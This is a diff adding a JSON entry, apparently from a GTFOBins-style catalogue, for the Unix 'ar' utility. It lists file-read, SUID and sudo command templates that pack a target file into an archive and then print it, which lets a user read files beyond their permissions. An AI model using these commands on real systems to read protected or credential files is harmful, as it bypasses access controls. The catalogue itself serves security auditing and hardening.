@@ -1,0 +1,20 @@
+{
+  "description": "The file appears amid the binary content of the archive.",
+  "functions": {
+    "file-read": [
+      {
+        "code": "ar r \"[output]\" \"[file]\"\ncat \"[output]\"\n"
+      }
+    ],
+    "suid": [
+      {
+        "code": "./ar r \"[output]\" \"[file]\"\ncat \"[output]\"\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo ar r \"[output]\" \"[file]\"\ncat \"[output]\"\n"
+      }
+    ]
+  }
+}
